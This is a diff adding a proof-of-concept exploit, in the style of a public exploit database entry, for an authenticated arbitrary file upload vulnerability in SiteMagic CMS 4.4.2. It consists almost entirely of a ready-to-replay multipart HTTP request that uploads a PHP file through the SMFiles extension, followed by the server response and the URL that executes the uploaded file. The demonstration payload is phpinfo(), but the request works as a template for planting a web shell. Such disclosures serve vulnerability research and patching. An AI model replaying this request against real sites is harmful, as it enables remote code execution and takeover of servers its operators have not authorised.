@@ -1,0 +1,60 @@
+# Exploit Title: SiteMagic CMS 4.4.2 - Arbitrary File Upload (Authenticated)
+# Date: 2020-09-02
+# Exploit Author: v1n1v131r4
+# Vendor Homepage: https://sitemagic.org/
+# Software Link: https://sitemagic.org/Download.html
+# Version: 4.4.2
+# Tested on: Ubuntu 18.04
+# CVE : N/A
+# PoC: https://github.com/V1n1v131r4/Unrestricted-File-Upload-on-SiteMagic-CMS-4.4.2/blob/master/README.md
+
+
+Step 1 - Request
+
+POST /sitemagic/index.php?SMExt=SMFiles&SMTemplateType=Basic&SMExecMode=Dedicated&SMFilesUpload&SMFilesUploadPath=files%2Fimages HTTP/1.1
+Host: example.org
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: pt-BR,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------144837887339078243581158835832
+Content-Length: 538
+Origin: example.org
+DNT: 1
+Connection: close
+Referer: http://example.org/sitemagic/index.php?SMExt=SMFiles&SMTemplateType=Basic&SMExecMode=Dedicated&SMFilesUpload&SMFilesUploadPath=files%2Fimages
+Cookie: timezone=America/Argentina/Buenos_Aires; cookieconsent_status=dismiss; SMSESSION407f70d0a9400582=f93d614ad0046ec76e41f3613d97da59
+Upgrade-Insecure-Requests: 1
+
+-----------------------------144837887339078243581158835832
+Content-Disposition: form-data; name="SMInputSMFilesUpload"; filename="info.php"
+Content-Type: application/x-php
+
+<?php phpinfo(); ?>
+
+-----------------------------144837887339078243581158835832
+Content-Disposition: form-data; name="SMPostBackControl"
+
+
+-----------------------------144837887339078243581158835832
+Content-Disposition: form-data; name="SMRequestToken"
+
+f9f116f33c012ce5e67f52dffc7e6bc6
+-----------------------------144837887339078243581158835832--
+
+
+
+
+Step 2 - Response
+
+Status 200 OK
+Version HTTP/1.1
+Transferred 26,20 KB (25,80 KB size)
+Referrer Policy no-referrer-when-downgrade
+
+
+
+
+Step 3 - Read file uploaded
+
+http://example.org/sitemagic/files/images/info.php
